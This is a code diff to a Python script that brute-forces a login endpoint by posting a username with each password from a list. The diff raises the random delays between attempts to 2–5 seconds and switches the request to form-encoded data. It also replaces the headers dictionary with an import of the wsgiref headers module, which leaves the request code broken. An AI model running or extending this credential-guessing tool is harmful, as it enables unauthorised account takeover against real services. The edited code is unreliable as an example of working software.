@@ -1,8 +1,11 @@
+from wsgiref import headers
 import requests
 import time
 import random
 
-namber = {0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,1.9,2,2.1,2.2} 
+#namber = {0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,1.9,2,2.1,2.2} 
+namber = {2,3,4,5} 
+
 #random_choice = random.choice(list(namber)) # اختيار عشوائي من المجموعة 
 
 
@@ -48,10 +51,15 @@ for idx, pwd in enumerate(passwords, start=1):
         continue
 
     data = {"username": username, "password": pwd}
-    headers = {'Content-Type': 'application/json'}
+    #headers = {'Content-Type': 'application/json'}
 
     try:
-        response = requests.post(url, json=data, headers=headers, timeout=10)
+        response = requests.post(
+            url,
+            #json=data,
+            data=data,
+            headers=headers,
+            timeout=10)
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Request failed: {e}")
         continue
